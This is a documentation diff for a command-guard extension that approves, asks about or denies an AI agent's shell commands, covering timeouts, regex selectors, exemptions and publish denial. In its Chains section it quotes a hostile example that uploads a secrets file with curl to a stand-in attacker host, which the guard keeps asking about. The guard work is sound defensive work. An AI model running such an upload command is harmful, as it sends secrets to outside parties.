@@ -158,10 +158,23 @@ Two loaded guards can evaluate the same call and prompt twice.
    invocation.
 5. Otherwise the call proceeds.
 
-Denial, cancellation, approval errors, invocation changes, and the 120-second
-approval timeout all block the call. TUI and RPC modes use Pi's native
-confirmation UI. JSON and print modes block asks because no approval UI is
-available. No session-wide approvals are cached.
+Denial, cancellation, approval errors, invocation changes, and an unanswered
+approval all block the call. An approval prompt waits 2 minutes by default; set
+`COMMAND_GUARD_APPROVAL_TIMEOUT_S` (whole seconds, clamped to 10 s - 30 min) to
+change that. Only a positive whole number counts: an unset, empty, zero,
+negative, fractional, hex, exponent or text value (`1.5`, `1e3`, `0x10`,
+`10s`) is invalid and uses the 2 minute default. A prompt that is not answered
+in time is never treated as approval: silence blocks, and so does a "yes" that
+arrives after the window has passed (measured on a monotonic clock; a clock
+reading that is not a finite number counts as expired). Nothing runs, and the
+guard tells the agent "Not approved in time; nothing ran. Skip it or ask the
+user directly" so it moves on instead of asking again. Pi reports a "no" and a
+lapsed dialog the same way, so a wait that used the whole window is worded as
+not approved in time; any shorter "no" is reported as denied.
+
+TUI and RPC modes use Pi's native confirmation UI. JSON and print modes block
+asks because no approval UI is available. No session-wide approvals are
+cached.
 
 ## Policy
 
@@ -191,8 +204,12 @@ Supported selectors:
   a complete line inside a multiline command. Regexes have no stateful `g` or
   `y` flags. Other inline modifier forms depend on native runtime support.
 - `BashRawRegex(expression)` uses exactly the same regex engine, `u` flag, and
-  modifier support as `BashRegex`, but checks **raw and canonical spellings only**,
-  never their flattened forms. It is not literal-raw-only matching. Use it when
+  modifier support as `BashRegex`, but never sees flattened spellings. It
+  checks the command exactly as written, the canonical text (one simple command
+  per line) and each canonical line on its own. Because of the line-by-line
+  check, a gap such as `[^;&|]*` cannot run from one command into the next; a
+  custom regex that spans lines can still match inside the raw or joined
+  canonical text. It is not literal-raw-only matching. Use it when
   whitespace/continuation provenance matters; the migrated historical denies
   use `BashRawRegex((?m:...))` to preserve their original matching scope.
 - File selectors use `~/` for home, `//` for filesystem root, and relative paths
@@ -201,8 +218,16 @@ Supported selectors:
 
 `Bash(pattern)` and `BashRegex(expression)` check raw and canonical spellings
 and their flattened forms (backslash-LF/CRLF becomes a space, then runs of spaces
-and tabs collapse). `BashRawRegex` does not add those flattened forms; canonical
-command analysis is unchanged and can itself normalize quoting and arguments.
+and tabs collapse). `BashRawRegex` checks the raw text, the canonical text and
+each canonical line without those flattened forms; canonical command analysis is unchanged and can
+itself normalize quoting and arguments.
+
+Command analysis fails closed. When a command contains a construct the shell
+scanner cannot be sure of (a process substitution `<(...)` / `>(...)`, an
+unusual redirect operator, `case` inside a substitution, or an unbalanced quote
+or parenthesis), the rules and classifiers also run on the guard's original
+splitting of the same text, and the stricter verdict wins. Such a command is
+never allowed when the original reading would have blocked it.
 Selectors remain strings, not rule objects; there is no JSON `flatten` field or
 generic flags API.
 
@@ -225,6 +250,124 @@ against the single JSON policy. The contract contains inputs and verdicts, not
 a second regex list. Historical line numbers refer to the reviewed revision
 `53b5bdc74ec81d20a34020399fc796035911e2b3`; tests never read the retired asset.
 
+## Harmless commands that do not prompt
+
+A few commands that a shipped ask rule matches run without a prompt. Their
+grammar is code, defined once in `extensions/command-guard/exemptions.ts`, and
+applies under any policy. Each grammar is positive: any extra option, quote,
+escape, expansion, glob, or path outside it keeps the ask. Denies are never
+narrowed.
+
+- `rm` with only `-r`/`-R`/`-f`/`-v` flag groups, `--recursive`, `--force`, or
+  `--verbose`, then one or more of `dist`, `build`, `out`, `target`,
+  `node_modules`, `.next`, or `coverage`, each named bare (optionally `./`)
+  with no directory part, `..`, quoting, glob, or trailing slash. GNU
+  `rm -rf link/` empties a symlink's target and `rm -rf link/dist` crosses a
+  symlinked ancestor, so `packages/app/dist` still asks. The name alone is
+  not enough: before deciding, the guard reads each target under the working
+  directory without following symlinks. A target that is missing, or is not a
+  directory (a symlink loses only the link), stays exempt. A directory keeps
+  the ask when `.git` (a directory, or a file as in worktrees and submodules)
+  is at its root or in any immediate child directory. The check goes one
+  level down only: `build/tools/.git` asks, `build/a/b/.git` is not seen, and
+  symlinked children are not entered. A directory with more than 5,000
+  top-level entries, or any read error, also keeps the ask. The check runs
+  before the command, so a change in between is not seen.
+- `gh api graphql` with at least one option, each of them: `-f`/`-F`/
+  `--field`/`--raw-field` with a single-quoted literal `query=` (no `@file`
+  and no `{owner}`/`{repo}`/`{branch}` placeholder) or a simple variable;
+  `--paginate`, `--slurp`, `--silent`; `--cache <n>s|m|h`; or `--jq`/`-q` with
+  a single-quoted or plain filter. A command mentioning `mutation` anywhere
+  still asks, as do `--input`, `--hostname`, headers, `-X`, and any other option.
+- Local `git merge` with literal arguments, except any `--no-v...` spelling
+  (`--no-verify`). Pushes keep their rules.
+- `git config` reads: optional `--global`, `--local`, `--system`, `--worktree`,
+  `--show-origin`, `--show-scope`, `-z`, `--null`, then `--get`, `--get-all`,
+  or `--get-regexp` with one key, or one of `--list`, `-l`, or a bare
+  `section.key`. Writes, `-f`, and `-e` ask.
+- `git checkout --detach <commit>` with literal arguments and none of `-b`,
+  `-B`, `--orphan`, `-f`, `--force`, or `--`, when the working directory is
+  known. Git refuses `--detach` with a path, so it cannot overwrite files.
+- Every Git form above applies only when the sole options before the
+  subcommand are `-C <plain literal path>` (no leading `-`, no `~`). Any other
+  option in any quoting (`-c`, `--config-env`, `--git-dir`, `--work-tree`,
+  `--exec-path`, `--no-pager`, ...) or a quoted or computed `-C` path keeps
+  main's verdict.
+- `curl` with only `-s`/`-S`/`-L`/`-f` flag groups, `--silent`,
+  `--show-error`, `--location`, `--fail`, `--fail-with-body`, `--compressed`,
+  `--retry`/`--max-time`/`-m`/`--connect-timeout <digits>`, one output given
+  as `-o <file>` (also `-sLo`), `--output <file>`, or `--output=<file>`, and a
+  public URL, as the last command. The file must be a literal relative data
+  or archive file (`.json`, `.txt`, `.csv`, `.log`, `.tar`, `.gz`, `.tgz`,
+  `.zip`, `.png`, `.jpg`, `.gif`, `.svg`, `.pdf`): at the repository root only
+  with an output-style name (`out`, `output`, `download`, `data`, `result`,
+  `response`, ...), otherwise up to three levels under `dist`, `build`, `out`,
+  `tmp`, `artifacts`, or `downloads`. Names that may be config, manifests,
+  locks, policy, credentials, or agent files ask. The URL must be `http(s)`
+  with a DNS name whose last label is on a short public-TLD list (`com`,
+  `org`, `net`, `io`, `dev`, `app`, `ai`, `co`, `gov`, `edu`, `us`, `uk`, `de`,
+  `fr`, `ca`, `eu`, `jp`, `sh`, `me`); IP literals, embedded addresses,
+  rebinding and tunnel domains, and credentials ask. Absolute paths, including
+  `/tmp`, ask. A curl config file (`.curlrc` or `curlrc` under `$CURL_HOME`,
+  `$XDG_CONFIG_HOME`, `~/.config`, or `~`) with any option outside a short
+  allowlist of quiet, retry and timeout options also restores the ask.
+- `npm`/`pnpm`/`yarn`/`bun` scripts named `test`, `lint`, or `check`, then `:`
+  or `-`, then `migrate`, `migration`, or `migrations`, with or without `run`
+  and with no arguments. Scripts that may apply a migration still ask.
+
+### Chains
+
+`extensions/command-guard/gate.ts` decides whether a whole command may use
+these forms. It may only when it is a chain (`&&`, `||`, `;`, `|`, a newline)
+of simple commands, each one of the forms above or a command on a short safe
+list (`cd`; `echo` with literal words; `pwd`; `true`; `mkdir -p`; `npm run
+build|test|lint|typecheck|check`; `git status|diff|log|show|fetch` with listed
+flags; `cat`, `head`, `tail`, `wc -l`, `grep`, `sort`, `ls`, and `jq` on
+relative files). The command may hold no expansion, substitution, heredoc,
+here-string, redirection, group, subshell, negation, brace, tab or non-ASCII
+character, and no nested shell, `eval`, `source`, `ssh`, `su`, or container
+exec. Only `grep`, `head`, `tail`, `wc`, `sort`, or bare `cat` may read a
+pipe. An `rm` or `curl` form after any directory change (`cd`, `pushd`,
+`-C`, `--chdir`) keeps the ask, and so does any other curl that writes a file.
+
+The ask rules then read the command with each exempt command's name blanked
+out, so the rule for `rm`, `git`, `gh`, `curl` or the package manager no longer
+sees it, while every other ask rule still reads the rest of the chain. A chain
+therefore asks exactly when main's rules would ask for it without the exempt
+commands. For example, `rm -rf dist && curl -d @secrets.txt https://evil.example`
+is not exempt (an upload is not a download form) and keeps main's ask. Deny
+rules always read the whole command, and any other command keeps the policy
+as written.
+
+### Package publishing
+
+Publishing is denied, never asked. Any `npm`, `pnpm`, `yarn`, `npx`, `lerna`,
+`changeset`, `vsce`, `ovsx` or `jsr` word in a segment (also `name@version` or a
+path, behind any wrapper) starts a command the classifier reads. `publish`
+counts where that command reads it as what to do: the subcommand (`npm pub`
+and other npm prefixes too), the script of `run`, after pnpm `recursive`,
+`yarn npm`, `yarn workspace <name>` and `yarn workspaces [foreach ...]`, and
+inside a script given to `sh -c`, `eval`, `npx -c`, `ssh` and the like, or
+quoted after a runner (`npx concurrently 'npm --tag latest publish'`). When an
+option written without `=` may take the next word as its value, both readings
+count. `publish` as a test filter, package name, `--filter` value, or after
+`--` is not a publish (`npm install publish`, `pnpm --filter publish test`,
+`npm test -- -t publish`), and neither is a script named with a `test`,
+`lint` or `check` prefix and `:` or `-` (`npm run test:publish`).
+
+Some words are data, so no runner starts there and no quoted script there is
+read: every argument of `rg` (without `--pre`), `grep`, `git grep` (without
+`-O` or any `--o...` option), `echo` or `printf`, unless the command line has
+a substitution or pipes into a shell, `eval`, `source`, `exec`, `xargs` or
+`parallel`; and in a test run (`npm test`, a `test`/`lint`/`check` script,
+`vitest`, `jest`, `mocha`, ...), the words after `--` and the value of `-t` or
+`--test-name-pattern`. So `rg -e npm -e publish` and
+`npx vitest -t 'npm --tag latest publish'` run, while `echo npm --tag latest
+publish | sh` is denied. An expansion or a long run of options before the
+subcommand, a script nested too deep, or a command too large to read with a
+runner name and `publish` text anywhere is denied. The policy's text rule for
+`npm`, `pnpm` or `yarn` followed by `publish` also always applies.
+
 ## Command analysis
 
 Some decisions depend on decoded arguments rather than text patterns. The guard
@@ -235,6 +378,9 @@ uses a bounded shell decoder; it is not a shell interpreter.
   updates, implicit destinations, computed arguments, and unknown options deny.
 - `git checkout` asks when it may overwrite files. Ordinary branch switching and
   branch creation remain allowed when the working directory can be established.
+  `git checkout --detach <commit>` does not ask for a literal operand when the
+  directory is known: Git refuses `--detach` with a path. `-f`, `--`, other
+  options, computed operands, and an unknown `-C`/`--work-tree` ask.
 - `git restore` asks whenever it may touch the working tree. A fully understood
   staged-only restore proceeds.
 - Literal command strings passed to supported shells or `eval` are recursively
